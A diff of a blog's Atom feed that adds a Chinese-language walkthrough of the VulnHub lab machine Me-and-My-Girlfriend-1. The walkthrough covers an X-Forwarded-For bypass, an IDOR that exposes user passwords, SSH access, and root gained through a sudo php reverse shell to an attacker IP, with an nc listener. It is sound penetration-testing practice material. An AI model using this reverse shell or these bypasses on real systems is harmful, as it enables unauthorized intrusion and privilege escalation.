@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://GodPang.github.io/"/>
-  <updated>2019-10-04T08:14:42.692Z</updated>
+  <updated>2020-01-28T15:27:38.977Z</updated>
   <id>https://GodPang.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>“vulnhub之Me-and-My-Girlfriend-1实战”</title>
+    <link href="https://GodPang.github.io/2020/01/28/%E2%80%9Cvulnhub%E4%B9%8BMe-and-My-Girlfriend-1%E5%AE%9E%E6%88%98%E2%80%9D/"/>
+    <id>https://GodPang.github.io/2020/01/28/“vulnhub之Me-and-My-Girlfriend-1实战”/</id>
+    <published>2020-01-28T14:52:44.000Z</published>
+    <updated>2020-01-28T15:27:38.977Z</updated>
+    
+    <content type="html"><![CDATA[<html><head></head><body><p><img src="https://i.loli.net/2020/01/28/AOmhT3p5vK1qr8e.png" alt="19.png"></p><a id="more"></a><h2 id="运行说明"><a href="#运行说明" class="headerlink" title="运行说明"></a>运行说明</h2><p>靶机名称：Me-and-My-Girlfriend-1<br>靶机难度：初学者/中级<br>目标：有两个flag，一个user-flag，一个root-flag<br>攻击机：kali linux，IP地址192.168.56.102<br>靶机：os-bytesec，IP地址192.168.199.100</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><ol><li>主机发现，对比开关主机前后发现目标主机<br><img src="https://i.loli.net/2020/01/28/UoplQW8LOscV2ji.png" alt="1.png"></li><li>扫描开放端口等信息<br><img src="https://i.loli.net/2020/01/28/8eOESyb1Il3UmuA.png" alt="2.png"></li><li>存在80端口，查看网页<br><img src="https://i.loli.net/2020/01/28/7ISfnQM4ojBuaEe.png" alt="3.png"><br>提示信息的意思是，把x-forwarded-for这个参数值改为本地值<br>I．使用burpsuite来修改<br>在bp的代理页中，添加一项本地参数并勾选，这样每次发包经过bp就会添加一个本地参数<br><img src="https://i.loli.net/2020/01/28/VQZf4rAJKYkPpWD.png" alt="4.png"><br>II. 使用chrom插件X-Forwarded-For Header<br><img src="https://i.loli.net/2020/01/28/Dfd3FGWO5KxiAqI.png" alt="5.png"></li><li>进入主网页，可以看到网站给出了Home Login Register About四个按钮<br><img src="https://i.loli.net/2020/01/28/o35C8XxRSslItWh.png" alt="6.png"><br>Home为主页按钮<br>Login为登录按钮，弱口令尝试登陆无效<br><img src="https://i.loli.net/2020/01/28/idRqs9njKey51ON.png" alt="7.png"><br>Register为注册按钮，我们注册一个账号<br><img src="https://i.loli.net/2020/01/28/UDLyGK7W6N9R53u.png" alt="8.png"><br>发现url参数中可以看到用户id，这里尝试修改user_id值，是否存在水平越权<br><img src="https://i.loli.net/2020/01/28/bfAtkSDEBcdPU17.png" alt="9.png"><br>纯在水平越权，并且修改前端type为test即可查看密码。联通光猫的管理界面也是纯在这个彩蛋的，并且超级管理员密码可以绕过查看。<br>根据提示我们需要寻找一个叫alice的账号，id需改为5时alice账户。<br><img src="https://i.loli.net/2020/01/28/zKwivpPqRgYbU5y.png" alt="10.png"></li><li>Nmap扫描时发现可以ssh远程连接，连接查看<br><img src="https://i.loli.net/2020/01/28/i4dgkB27rVLpnGZ.png" alt="11.png"><br>查看信息<br><img src="https://i.loli.net/2020/01/28/5LxghACp3kQmGd7.png" alt="12.png"><br>发现第一个flag<br><img src="https://i.loli.net/2020/01/28/D9157L8xThOqQtw.png" alt="13.png"></li><li>提权<br>查看alice的权限<br><img src="https://i.loli.net/2020/01/28/P5bJzCGDhw2fKdn.png" alt="14.png"><br>Alice可在主机中所使用root权限<br>Web服务器为Apache，所以我们进入目录下查看信息</li><li>发现了一些美妙的东西，看了别人的步骤才知道,我没有进行目录扫描，之前没有发现这些目录和信息，不过小小不言。<br><img src="https://i.loli.net/2020/01/28/U8loYnJwFhGuf47.png" alt="15.png"><br>进入config目录<br><img src="https://i.loli.net/2020/01/28/rymcTDRvsk8Ip3J.png" alt="16.png"><br>查看，发现更美妙的东西<br><img src="https://i.loli.net/2020/01/28/IrGjfP6bsOSY2Kk.png" alt="081193EC-581D-42CF-A197-24867096DABD.png"><br>尝试连接sql数据库查看信息<br><img src="https://i.loli.net/2020/01/28/zp2A6eVI8MdFag7.png" alt="18.png"><br>额 没什么用<br>利用nc反弹shell<br>在kali开启nc反弹端口 nc -lvp 7777<br>然后靶机上的alice创建一个php反弹shell去连接它：<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/php -r '$sock=fsockopen("192.168.153.139",7777);exec("/bin/bash -i <span class="tag"><<span class="name">&3</span> ></span>&3 2>&3");'</span><br></pre></td></tr></tbody></table></figure></li></ol><p>返回kali这边已经登录进root了<br><img src="https://i.loli.net/2020/01/28/AOmhT3p5vK1qr8e.png" alt="19.png"></p><ol start="8"><li>Nc反弹shell的几种常用方式<br><a href="https://www.cnblogs.com/-chenxs/p/11748488.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/11748488.html</a></li><li>其实mysql密码就是root的登录密码233333</li></ol></body></html>]]></content>
+    
+    <summary type="html">
+    
+      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/01/28/AOmhT3p5vK1qr8e.png&quot; alt=&quot;19.png&quot;&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+    
+    </summary>
+    
+      <category term="vulnhub靶机" scheme="https://GodPang.github.io/categories/vulnhub%E9%9D%B6%E6%9C%BA/"/>
+    
+    
+      <category term="web" scheme="https://GodPang.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>bugku密码学通关指南</title>
